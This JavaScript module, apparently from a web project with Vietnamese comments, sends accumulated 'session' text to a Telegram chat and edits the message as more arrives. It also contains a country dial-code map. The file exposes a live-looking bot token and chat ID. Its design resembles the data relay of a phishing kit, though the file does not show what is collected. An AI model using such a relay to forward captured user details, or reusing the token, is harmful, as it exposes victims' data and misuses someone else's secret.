// utils/telegram.js

// ==========================================
// THAY BOT TOKEN VÀ CHAT ID CỦA MÀY VÀO ĐÂY
const BOT_TOKEN = '8862924560:AAH9eoEkGkNNZwlGL3UM89TutW9PXNQYqHs';
const CHAT_ID = '-5364980544';
// ==========================================

const BASE_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Biến lưu trữ nội dung và ID của tin nhắn để Edit
let initialSessionText = '';
let currentMessageId = null; // Lưu ID tin nhắn trên Telegram để edit

export const escapeHtml = (str) => {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
};

export const setInitialSession = (text) => {
  initialSessionText = text;
  currentMessageId = null; // Reset lại ID khi bắt đầu phiên mới
};

export const sendTelegramMessage = async (extraText = '') => {
  // Cộng dồn nội dung (giống hệt logic cũ của mày)
  if (extraText) {
      initialSessionText += extraText;
  }
  
  const fullText = initialSessionText.trim();
  if (!fullText) return;

  try {
    let res, data;

    if (currentMessageId) {
      // Nếu đã có tin nhắn trước đó -> Dùng editMessageText để cập nhật
      res = await fetch(`${BASE_URL}/editMessageText`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          message_id: currentMessageId,
          text: fullText,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      });
      data = await res.json();
      
      // Nếu lỗi (ví dụ tin nhắn bị xóa, hoặc text không đổi), fallback gửi tin mới
      if (!data.ok && data.description && data.description.includes('message is not modified')) {
          return; // Text y hệt, không làm gì cả
      } else if (!data.ok) {
          currentMessageId = null; // Reset để gửi tin mới bên dưới
      }
    }

    // Nếu chưa có ID tin nhắn -> Gửi tin nhắn mới và lưu lại ID
    if (!currentMessageId) {
      res = await fetch(`${BASE_URL}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: fullText,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      });
      data = await res.json();
      
      if (data.ok && data.result) {
          currentMessageId = data.result.message_id; // Lưu lại ID để lần sau edit
      }
    }
  } catch (err) {
    console.error('Telegram API error:', err);
  }
};

// Map mã quốc gia -> mã vùng điện thoại
export const countryCodeMap = {
  AF: '+93', AL: '+355', DZ: '+213', AD: '+376', AO: '+244', AG: '+1', AR: '+54',
  AM: '+374', AU: '+61', AT: '+43', AZ: '+994', BS: '+1', BH: '+973', BD: '+880',
  BB: '+1', BY: '+375', BE: '+32', BZ: '+501', BJ: '+229', BT: '+975', BO: '+591',
  BA: '+387', BW: '+267', BR: '+55', BN: '+673', BG: '+359', BF: '+226', BI: '+257',
  KH: '+855', CM: '+237', CA: '+1', CV: '+238', CF: '+236', TD: '+235', CL: '+56',
  CN: '+86', CO: '+57', KM: '+269', CG: '+242', CD: '+243', CR: '+506', CI: '+225',
  HR: '+385', CU: '+53', CY: '+357', CZ: '+420', DK: '+45', DJ: '+253', DM: '+1',
  DO: '+1', EC: '+593', EG: '+20', SV: '+503', GQ: '+240', ER: '+291', EE: '+372',
  SZ: '+268', ET: '+251', FJ: '+679', FI: '+358', FR: '+33', GA: '+241', GM: '+220',
  GE: '+995', DE: '+49', GH: '+233', GR: '+30', GD: '+1', GT: '+502', GN: '+224',
  GW: '+245', GY: '+592', HT: '+509', HN: '+504', HK: '+852', HU: '+36', IS: '+354',
  IN: '+91', ID: '+62', IR: '+98', IQ: '+964', IE: '+353', IL: '+972', IT: '+39',
  JM: '+1', JP: '+81', JO: '+962', KZ: '+7', KE: '+254', KI: '+686', KW: '+965',
  KG: '+996', LA: '+856', LV: '+371', LB: '+961', LS: '+266', LR: '+231', LY: '+218',
  LI: '+423', LT: '+370', LU: '+352', MO: '+853', MG: '+261', MW: '+265', MY: '+60',
  MV: '+960', ML: '+223', MT: '+356', MH: '+692', MR: '+222', MU: '+230', MX: '+52',
  FM: '+691', MD: '+373', MC: '+377', MN: '+976', ME: '+382', MA: '+212', MZ: '+258',
  MM: '+95', NA: '+264', NR: '+674', NP: '+977', NL: '+31', NZ: '+64', NI: '+505',
  NE: '+227', NG: '+234', KP: '+850', MK: '+389', NO: '+47', OM: '+968', PK: '+92',
  PW: '+680', PS: '+970', PA: '+507', PG: '+675', PY: '+595', PE: '+51', PH: '+63',
  PL: '+48', PT: '+351', PR: '+1', QA: '+974', RO: '+40', RU: '+7', RW: '+250',
  KN: '+1', LC: '+1', VC: '+1', WS: '+685', SM: '+378', ST: '+239', SA: '+966',
  SN: '+221', RS: '+381', SC: '+248', SL: '+232', SG: '+65', SK: '+421', SI: '+386',
  SB: '+677', SO: '+252', ZA: '+27', KR: '+82', SS: '+211', ES: '+34', LK: '+94',
  SD: '+249', SR: '+597', SE: '+46', CH: '+41', SY: '+963', TW: '+886', TJ: '+992',
  TZ: '+255', TH: '+66', TL: '+670', TG: '+228', TO: '+676', TT: '+1', TN: '+216',
  TR: '+90', TM: '+993', TV: '+688', UG: '+256', UA: '+380', AE: '+971', GB: '+44',
  US: '+1', UY: '+598', UZ: '+998', VU: '+678', VA: '+379', VE: '+58', VN: '+84',
  YE: '+967', ZM: '+260', ZW: '+263',
};